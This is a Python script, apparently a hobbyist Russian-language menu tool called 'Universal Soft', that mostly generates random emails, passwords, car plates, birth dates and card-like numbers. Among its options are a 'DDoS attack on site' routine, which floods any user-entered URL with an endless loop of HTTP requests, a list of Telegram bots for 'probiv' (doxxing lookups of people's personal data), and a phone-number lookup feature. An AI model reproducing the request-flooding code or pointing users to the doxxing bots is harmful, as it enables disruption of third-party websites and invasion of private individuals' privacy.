from colorama import init
from termcolor import colored
from art import *
import time
import random
import sys
import threading
import requests
import phonenumbers
from phonenumbers import geocoder
from phonenumbers import carrier
from phonenumbers import timezone

init()

text1 = text2art("Universal", space = 0)
text2 = text2art("Soft", space = 0)


print(colored(text1, "blue"))
print(colored(text2, "red"))

author = text2art("by: shota", space = 0)
print(colored(author, "blue"))

email_types = ["gmail.com", "yandex.com", "mail.ru"]
email_bykves = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "w", "v", "x", "y", "z"]
rnd = random.choice(email_types)
rnd1 = random.choice(email_bykves)
rnd2 = random.choice(email_bykves)
rnd3 = random.choice(email_bykves)
rnd4 = random.choice(email_bykves)
rnd5 = random.choice(email_bykves)

rnd6 = random.choice(email_bykves)
rnd7 = random.choice(email_bykves)
rnd8 = random.choice(email_bykves)
rnd9 = random.choice(email_bykves)
rnd10 = random.choice(email_bykves)

email = rnd1 + rnd2 + rnd3 + rnd4 + rnd5 + rnd6 + rnd7 + rnd8 + rnd9 + rnd10 + "@" + rnd

pass_int1 = "6"
pass_int2 = "9"
pass_int3 = "2"
pass_int4 = "4"
pass_int5 = "7"

password_string = ["a", "b", "c", "d", "e", "f", "h", "i", "g", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "v", "z", "y", "1", "3", "5", "8"]
string1 = random.choice(password_string)
string2 = random.choice(password_string)
string3 = random.choice(password_string)

password = pass_int1 + string1 + string2 + pass_int2 + pass_int3 + string3 + pass_int4 + pass_int5

car1 = ["a", "b", "c", "d", "e", "f", "g", "k"]
car2 = ["l", "m", "n", "o", "p", "q", "r", "s"]

car3 = ["1", "2", "3", "4", "5"]
car4 = ["6", "7", "8", "9"]

car5 = random.choice(car1)
car6 = random.choice(car2)

car7 = random.choice(car3)
car8 = random.choice(car4)

car_numb = car5 + car6 + car7 + car8

years = ["2006", "2007", "2008", "2009", "1999", "2000", "2002", "2003", "2004"]
months = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"]
days = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28"]

days2 = random.choice(days)
months2 = random.choice(months)
years2 = random.choice(years)

date_birthday = days2 + "/" + months2 + "/" + years2

countrys = ["Россия", "Украина", "Казахстан", "Беларусь"]
citys = ["Москва", "Краснодар", "Воронеж", "Курск", "Волгоград", "Санкт-петербург", "Ростов-На-Дону"]

country = random.choice(countrys)

if country == "Украина":
    citys = ["Киев", "Львов", "Запорожье", "Днепр", "Харьков"]
    
if country == "Казахстан":
    citys = ["Астана", "Алматы", "Актобе", "Шымкент"]
    
city = random.choice(citys)

numcards = ["2202 2638 7362 8363", "2202 7463 7363", "2202 7363 3837", "2202 6383 7364", "2202 6353 2425", "2202 5463 6352", "2202 5362 6363"]
numcard = random.choice(numcards)

text3 = colored("1.Генератор Email", "blue")
text4 = colored("2.Генератор Пароля", "red")
text6 = colored("3.Генератор Номера Машины", "blue")
text8 = colored("4.Генератор Даты Рождения", "red")
text9 = colored("5.Боты для догса", "blue")
text10 = colored("6.Генератор Страны и города", "red")
text11 = colored("7.ДДОС атака на Сайт", "blue")
text12 = colored("8.Генератор номера Карточки", "red")
text13 = colored("9.Пробив по Номеру", "blue")
text14 = colored("10.Выход", "red")

print(text3)
print(text4)
print(text6)
print(text8)
print(text9)
print(text10)
print(text11)
print(text12)
print(text13)
print(text14)

print(colored("--------------------------------", "magenta"))

user_choice = int(input(colored("Введи:", "red")))

if user_choice == 1:
    time.sleep(random.randint(1, 3))
    print(colored(f"Ваш случайный Емаил: {email}", "blue"))
    
if user_choice == 2:
    time.sleep(random.randint(1, 3))
    print(colored(f"Ваш случайный пароль: {password}", "red"))
    
if user_choice == 3:
    time.sleep(random.randint(1, 3))
    print(colored(f"Ваш случайный номер машины: {car_numb}", "blue"))
    
if user_choice == 4:
    time.sleep(random.randint(1, 3))
    print(colored(f"Ваша случайная дата рождения в формате день/месяц/год: {date_birthday}", "red"))
    
if user_choice == 10:
    exit()
    
if user_choice == 5:
    time.sleep(random.randint(1, 3))
    print(colored("@Orakul2_robot, @probivdoxfree_bot, @quickosint110_bot, @userbox69_bot, @ezzprobiv_bot", "magenta"))
    
if user_choice == 6:
    time.sleep(random.randint(1, 3))
    print(colored(f"Ваша случайная Страна и Город: {city}, {country}", "blue"))
    
if user_choice == 7:
    time.sleep(1)
    request = 0
    threads = 1000
    url = input(colored("Введите url адрес для DDOS'а:", "red"))
    
    print(colored("Начинаю ДДОС...", "blue"))
    def ddos():
       global request
       while True:
           try:
              res = requests.get(url)
              request += 1
              print(colored(f"Запрос №{request} успешно отправлен!", "blue"))
           except requests.exceptions.ConnectionError:
               print(colored("Ошибка.", "red"))
    thread = threading.Thread(target = ddos)
    thread.start()
    
if user_choice == 8:
    time.sleep(random.randint(1, 3))
    print(colored(f"Ваш случайный номер карточки: {numcard}", "blue"))
    
if user_choice == 9:
    number_format = input(colored("Введите код страны (к примеру +7):", "blue"))
    number = input(colored("Введите сам номер без плюса и кода страны:", "red"))
    
    full_number = f"{number_format}{number}"
    time.sleep(random.randint(3, 6))
    
    number_parse = phonenumbers.parse(full_number)
    number_zone = timezone.time_zones_for_number(number_parse)
    
    Carrier = phonenumbers.carrier.name_for_number(number_parse, "ru")
    Region = geocoder.description_for_number(number_parse, "ru")
    
    is_valid = phonenumbers.is_valid_number(number_parse)
    is_possible = phonenumbers.is_possible_number(number_parse)
    
    telegram = f"https://t.me/{full_number}"
    whatsapp = f"https://wa.me/{full_number}"
    
    viber = f"https://viber.click/{full_number}"
    vk = f"https://vk.me/{full_number}"
    
    if is_valid == True:
        is_valid = "Да"
    else:
        is_valid == "Нет"
        
    if is_possible == True:
         is_possible = "Да"
    else:
         is_possible = "Нет"
    
    print(colored(f"[+]Временные зоны номера: {number_zone}", "blue"))
    print(colored(f"[+]Страна проживания: {Region}", "blue"))
    print(colored(f"[+]Валиден ли: {is_valid}", "blue"))
    print(colored(f"[+]Доступен ли для звонков и смс: {is_possible}", "blue"))
    print(colored(f"[+]Телеграм: {telegram}", "blue"))
    print(colored(f"[+]Вацап: {whatsapp}", "blue"))
    print(colored(f"[+]Вайбер: {viber}", "blue"))
    print(colored(f"[+]ВК: {vk}", "blue"))
    
    